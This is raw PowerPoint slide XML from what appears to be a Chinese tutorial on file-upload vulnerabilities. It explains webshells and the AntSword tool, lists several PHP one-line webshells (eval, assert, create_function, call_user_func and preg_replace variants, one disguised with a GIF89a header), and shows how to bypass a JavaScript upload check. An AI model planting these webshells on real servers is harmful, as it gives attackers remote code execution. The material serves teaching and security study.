                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="6751952" y="1122838"/>
                  <a:pt x="7643456" y="696890"/>
                  <a:pt x="8762487" y="0"/>
                </a:cubicBezTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="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dk1">
                  <a:lumMod val="65000"/>
                  <a:lumOff val="35000"/>
                </a:schemeClr>
              </a:solidFill>
              <a:latin typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="任意多边形: 形状 5"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId10"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="10800000" flipH="1">
            <a:off x="-1" y="893706"/>
            <a:ext cx="12192001" cy="460144"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="connsiteX0" fmla="*/ 0 w 12192000"/>
              <a:gd name="connsiteY0" fmla="*/ 0 h 914409"/>
              <a:gd name="connsiteX1" fmla="*/ 3062514 w 12192000"/>
              <a:gd name="connsiteY1" fmla="*/ 914400 h 914409"/>
              <a:gd name="connsiteX2" fmla="*/ 6096000 w 12192000"/>
              <a:gd name="connsiteY2" fmla="*/ 0 h 914409"/>
              <a:gd name="connsiteX3" fmla="*/ 9144000 w 12192000"/>
              <a:gd name="connsiteY3" fmla="*/ 914400 h 914409"/>
              <a:gd name="connsiteX4" fmla="*/ 12192000 w 12192000"/>
              <a:gd name="connsiteY4" fmla="*/ 14514 h 914409"/>
              <a:gd name="connsiteX0-1" fmla="*/ 0 w 12166242"/>
              <a:gd name="connsiteY0-2" fmla="*/ 491476 h 947169"/>
              <a:gd name="connsiteX1-3" fmla="*/ 3036756 w 12166242"/>
              <a:gd name="connsiteY1-4" fmla="*/ 914400 h 947169"/>
              <a:gd name="connsiteX2-5" fmla="*/ 6070242 w 12166242"/>
              <a:gd name="connsiteY2-6" fmla="*/ 0 h 947169"/>
              <a:gd name="connsiteX3-7" fmla="*/ 9118242 w 12166242"/>
              <a:gd name="connsiteY3-8" fmla="*/ 914400 h 947169"/>
              <a:gd name="connsiteX4-9" fmla="*/ 12166242 w 12166242"/>
              <a:gd name="connsiteY4-10" fmla="*/ 14514 h 947169"/>
              <a:gd name="connsiteX0-11" fmla="*/ 0 w 12166242"/>
              <a:gd name="connsiteY0-12" fmla="*/ 491476 h 1118533"/>
              <a:gd name="connsiteX1-13" fmla="*/ 3036756 w 12166242"/>
              <a:gd name="connsiteY1-14" fmla="*/ 914400 h 1118533"/>
              <a:gd name="connsiteX2-15" fmla="*/ 6070242 w 12166242"/>
              <a:gd name="connsiteY2-16" fmla="*/ 0 h 1118533"/>
              <a:gd name="connsiteX3-17" fmla="*/ 9118242 w 12166242"/>
              <a:gd name="connsiteY3-18" fmla="*/ 914400 h 1118533"/>
              <a:gd name="connsiteX4-19" fmla="*/ 12166242 w 12166242"/>
              <a:gd name="connsiteY4-20" fmla="*/ 14514 h 1118533"/>
              <a:gd name="connsiteX0-21" fmla="*/ 0 w 12166242"/>
              <a:gd name="connsiteY0-22" fmla="*/ 493388 h 1295533"/>
              <a:gd name="connsiteX1-23" fmla="*/ 2985241 w 12166242"/>
              <a:gd name="connsiteY1-24" fmla="*/ 1218759 h 1295533"/>
              <a:gd name="connsiteX2-25" fmla="*/ 6070242 w 12166242"/>
              <a:gd name="connsiteY2-26" fmla="*/ 1912 h 1295533"/>
              <a:gd name="connsiteX3-27" fmla="*/ 9118242 w 12166242"/>
              <a:gd name="connsiteY3-28" fmla="*/ 916312 h 1295533"/>
              <a:gd name="connsiteX4-29" fmla="*/ 12166242 w 12166242"/>
              <a:gd name="connsiteY4-30" fmla="*/ 16426 h 1295533"/>
              <a:gd name="connsiteX0-31" fmla="*/ 0 w 12166242"/>
              <a:gd name="connsiteY0-32" fmla="*/ 493389 h 1337371"/>
              <a:gd name="connsiteX1-33" fmla="*/ 2985241 w 12166242"/>
              <a:gd name="connsiteY1-34" fmla="*/ 1218760 h 1337371"/>
              <a:gd name="connsiteX2-35" fmla="*/ 6070242 w 12166242"/>
              <a:gd name="connsiteY2-36" fmla="*/ 1913 h 1337371"/>
              <a:gd name="connsiteX3-37" fmla="*/ 9118242 w 12166242"/>
              <a:gd name="connsiteY3-38" fmla="*/ 916313 h 1337371"/>
              <a:gd name="connsiteX4-39" fmla="*/ 12166242 w 12166242"/>
              <a:gd name="connsiteY4-40" fmla="*/ 16427 h 1337371"/>
              <a:gd name="connsiteX0-41" fmla="*/ 0 w 12140484"/>
              <a:gd name="connsiteY0-42" fmla="*/ 741602 h 1585583"/>
              <a:gd name="connsiteX1-43" fmla="*/ 2985241 w 12140484"/>
              <a:gd name="connsiteY1-44" fmla="*/ 1466973 h 1585583"/>
              <a:gd name="connsiteX2-45" fmla="*/ 6070242 w 12140484"/>
              <a:gd name="connsiteY2-46" fmla="*/ 250126 h 1585583"/>
              <a:gd name="connsiteX3-47" fmla="*/ 9118242 w 12140484"/>
              <a:gd name="connsiteY3-48" fmla="*/ 1164526 h 1585583"/>
              <a:gd name="connsiteX4-49" fmla="*/ 12140484 w 12140484"/>
              <a:gd name="connsiteY4-50" fmla="*/ 0 h 1585583"/>
              <a:gd name="connsiteX0-51" fmla="*/ 0 w 12140484"/>
              <a:gd name="connsiteY0-52" fmla="*/ 741602 h 1585583"/>
              <a:gd name="connsiteX1-53" fmla="*/ 2985241 w 12140484"/>
              <a:gd name="connsiteY1-54" fmla="*/ 1466973 h 1585583"/>
              <a:gd name="connsiteX2-55" fmla="*/ 6070242 w 12140484"/>
              <a:gd name="connsiteY2-56" fmla="*/ 250126 h 1585583"/>
              <a:gd name="connsiteX3-57" fmla="*/ 9118242 w 12140484"/>
              <a:gd name="connsiteY3-58" fmla="*/ 1164526 h 1585583"/>
              <a:gd name="connsiteX4-59" fmla="*/ 12140484 w 12140484"/>
              <a:gd name="connsiteY4-60" fmla="*/ 0 h 1585583"/>
              <a:gd name="connsiteX0-61" fmla="*/ 0 w 12140484"/>
              <a:gd name="connsiteY0-62" fmla="*/ 741602 h 1538291"/>
              <a:gd name="connsiteX1-63" fmla="*/ 2985241 w 12140484"/>
              <a:gd name="connsiteY1-64" fmla="*/ 1466973 h 1538291"/>
              <a:gd name="connsiteX2-65" fmla="*/ 3377997 w 12140484"/>
              <a:gd name="connsiteY2-66" fmla="*/ 1373570 h 1538291"/>
              <a:gd name="connsiteX3-67" fmla="*/ 6070242 w 12140484"/>
              <a:gd name="connsiteY3-68" fmla="*/ 250126 h 1538291"/>
              <a:gd name="connsiteX4-69" fmla="*/ 9118242 w 12140484"/>
              <a:gd name="connsiteY4-70" fmla="*/ 1164526 h 1538291"/>
              <a:gd name="connsiteX5" fmla="*/ 12140484 w 12140484"/>
              <a:gd name="connsiteY5" fmla="*/ 0 h 1538291"/>
              <a:gd name="connsiteX0-71" fmla="*/ 0 w 12140484"/>
              <a:gd name="connsiteY0-72" fmla="*/ 741602 h 1381432"/>
              <a:gd name="connsiteX1-73" fmla="*/ 3377997 w 12140484"/>
              <a:gd name="connsiteY1-74" fmla="*/ 1373570 h 1381432"/>
              <a:gd name="connsiteX2-75" fmla="*/ 6070242 w 12140484"/>
              <a:gd name="connsiteY2-76" fmla="*/ 250126 h 1381432"/>
              <a:gd name="connsiteX3-77" fmla="*/ 9118242 w 12140484"/>
              <a:gd name="connsiteY3-78" fmla="*/ 1164526 h 1381432"/>
              <a:gd name="connsiteX4-79" fmla="*/ 12140484 w 12140484"/>
              <a:gd name="connsiteY4-80" fmla="*/ 0 h 1381432"/>
              <a:gd name="connsiteX0-81" fmla="*/ 0 w 8762487"/>
              <a:gd name="connsiteY0-82" fmla="*/ 1373570 h 1373569"/>
              <a:gd name="connsiteX1-83" fmla="*/ 2692245 w 8762487"/>
              <a:gd name="connsiteY1-84" fmla="*/ 250126 h 1373569"/>
              <a:gd name="connsiteX2-85" fmla="*/ 5740245 w 8762487"/>
              <a:gd name="connsiteY2-86" fmla="*/ 1164526 h 1373569"/>
              <a:gd name="connsiteX3-87" fmla="*/ 8762487 w 8762487"/>
              <a:gd name="connsiteY3-88" fmla="*/ 0 h 1373569"/>
            </a:gdLst>
            <a:ahLst/>
            <a:cxnLst>
              <a:cxn ang="0">
                <a:pos x="connsiteX0-1" y="connsiteY0-2"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="connsiteX1-3" y="connsiteY1-4"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="connsiteX2-5" y="connsiteY2-6"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="connsiteX3-7" y="connsiteY3-8"/>
              </a:cxn>
            </a:cxnLst>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="8762487" h="1373569">
                <a:moveTo>
                  <a:pt x="0" y="1373570"/>
                </a:moveTo>
                <a:cubicBezTo>
                  <a:pt x="1011707" y="1291657"/>
                  <a:pt x="1735538" y="284967"/>
                  <a:pt x="2692245" y="250126"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="3648953" y="215285"/>
                  <a:pt x="4728538" y="1206214"/>
                  <a:pt x="5740245" y="1164526"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="6751952" y="1122838"/>
                  <a:pt x="7643456" y="696890"/>
                  <a:pt x="8762487" y="0"/>
                </a:cubicBezTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="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dk1">
                  <a:lumMod val="65000"/>
                  <a:lumOff val="35000"/>
                </a:schemeClr>
              </a:solidFill>
              <a:latin typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="椭圆 7"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId11"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066020" y="5459902"/>
            <a:ext cx="196354" cy="196354"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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9" name="椭圆 8"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId12"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3692329" y="5237718"/>
            <a:ext cx="371672" cy="371672"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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dirty="0">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="椭圆 9"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId13"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8489335" y="5592623"/>
            <a:ext cx="371672" cy="371672"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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dirty="0">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="椭圆 10"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId14"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="11375313" y="5342739"/>
            <a:ext cx="207087" cy="207087"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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dirty="0">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="椭圆 11"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId15"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4504182" y="4993377"/>
            <a:ext cx="654160" cy="654160"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk2">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dirty="0">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="文本框 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId16"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1714500" y="1723305"/>
            <a:ext cx="8610600" cy="2806065"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="90000" tIns="46800" rIns="90000" bIns="4680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lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="5400" b="1" spc="380">
                <a:solidFill>
                  <a:schemeClr val="accent1">
                    <a:lumMod val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:uFillTx/>
                <a:latin typeface="黑体" panose="02010609060101010101" charset="-122"/>
                <a:ea typeface="黑体" panose="02010609060101010101" charset="-122"/>
              </a:rPr>
              <a:t>文件上传</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="5400" b="1" spc="380">
              <a:solidFill>
                <a:schemeClr val="accent1">
                  <a:lumMod val="75000"/>
                </a:schemeClr>
              </a:solidFill>
              <a:uFillTx/>
              <a:latin typeface="黑体" panose="02010609060101010101" charset="-122"/>
              <a:ea typeface="黑体" panose="02010609060101010101" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:custDataLst>
      <p:tags r:id="rId17"/>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文件上传本质上就是将文件传输到服务器时没有做好检测和过滤，导致可上传恶意程序到服务器，从而获得后台权限来干点坏事。一般这个恶意脚本文件称为webshell，通过webshell我们可以查看服务器的目录结构或文件，以及来执行一些系统指令。小马和大马，简单来说，大马是多功能，危害大，体积大的木马，小马是隐蔽性强，体量小，更方便的小木马。一句话木马就属于小马，所以较易突破防护，而大马极易被过滤。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>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9055" y="80645"/>
            <a:ext cx="7261225" cy="492760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="4000"/>
              <a:t>文件上传的重要工具：蚁剑</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="4000"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="文本框 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="1249045"/>
            <a:ext cx="7998460" cy="2376805"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>蚁剑（AntSword）是什么？</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>中国蚁剑是一款开源的跨平台网站管理工具，它主要面向于合法授权的渗透测试安全人员以及进行常规操作的网站管理员。</a:t>
            </a:r>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44450"/>
            <a:ext cx="4064000" cy="368300"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>使用方法：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN"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一句话木马</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:p>
            <a:r>
              <a:t>   &lt;?php @eval($_POST['</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>a</a:t>
            </a:r>
            <a:r>
              <a:t>']);?&gt;</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="文本框 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="964565" y="2557145"/>
            <a:ext cx="6096000" cy="1198880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>其中eval就是执行命令的函数，$_POST['a']就是接收的数据。eval函数把接收的数据当作PHP代码来执行。这样我们就能够让插入了一句话木马的网站执行我们传递过去的任意PHP语句。这便是一句话木马的强大之处。</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其他一句话木马</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="文本框 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="6096000" cy="922020"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>assert函数</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>&lt;?php assert(@$_POST['a']); ?&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="文本框 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="3182620"/>
            <a:ext cx="6096000" cy="1753235"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>create_function函数</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>    &lt;?php </a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>    $fun = create_function('',$_POST['a']);</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>    $fun();</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>    ?&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="文本框 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="908685" y="5166360"/>
            <a:ext cx="6096000" cy="1476375"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>call_user_func回调函数</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>    &lt;?php</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>    @call_user_func(assert,$_POST['a']);</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>    ?&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="文本框 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4544060" y="1698625"/>
            <a:ext cx="6096000" cy="1476375"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>preg_replace函数</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>    &lt;?php </a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>    @preg_replace("/abcde/e", $_POST['a'], "abcdefg");</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>    ?&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="文本框 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5311775" y="4478655"/>
            <a:ext cx="6096000" cy="368300"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>GIF89a?&lt;script language="php"&gt;eval($_REQUEST[1])&lt;/script&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="文本框 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5211445" y="4110355"/>
            <a:ext cx="6096000" cy="368300"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>文件幻术头</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js</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>前端验证</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>https://www.yzktw.com.cn/post/1449712.html</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>这里以火狐浏览器为例，首先需要在浏览器地址栏输入about:config并按回车，在高级首选项搜索框界面中搜索javascript.enabled，点击转换按钮将true值切换为false，然后回到原来的网页就可以上传php文件了。</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25" name="组合 24"/>
          <p:cNvGrpSpPr/>
          <p:nvPr userDrawn="1">
            <p:custDataLst>
              <p:tags r:id="rId1"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="152827" y="104775"/>
            <a:ext cx="11901060" cy="268446"/>
            <a:chOff x="152827" y="104775"/>
            <a:chExt cx="11901060" cy="268446"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="26" name="等腰三角形 25"/>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7" name="等腰三角形 26"/>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8" name="等腰三角形 27"/>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sp>
          <p:nvSpPr>
            <p:cNvPr id="29" name="等腰三角形 28"/>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dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
